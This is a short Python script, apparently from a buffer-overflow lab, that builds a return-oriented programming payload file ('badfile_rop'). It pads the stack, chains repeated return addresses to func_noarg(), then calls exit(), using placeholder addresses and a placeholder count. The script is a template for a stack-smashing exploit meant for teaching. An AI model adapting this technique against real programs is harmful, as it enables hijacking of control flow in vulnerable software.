#!/usr/bin/python3
#rop_noargument.py

import sys

func_noarg_addr = 0xAAAAAAAA  # The address of func_noarg()
exit_addr = 0xBBBBBBBB        # The address of exit()
times = CC                    # Number of times func_noarg() is entered      

def tobytes (value):
   return (value).to_bytes(4,byteorder='little')

content = bytearray(0xaa for i in range(112))
content += tobytes(0xFFFFFFFF)

# Chain bar() functions together
for i in range(times):
   content += tobytes(func_noarg_addr)

# Invoke exit() to exit the program
content += tobytes(exit_addr)

# Write the content to badfile
with open('badfile_rop', 'wb') as f:
    f.write(content)
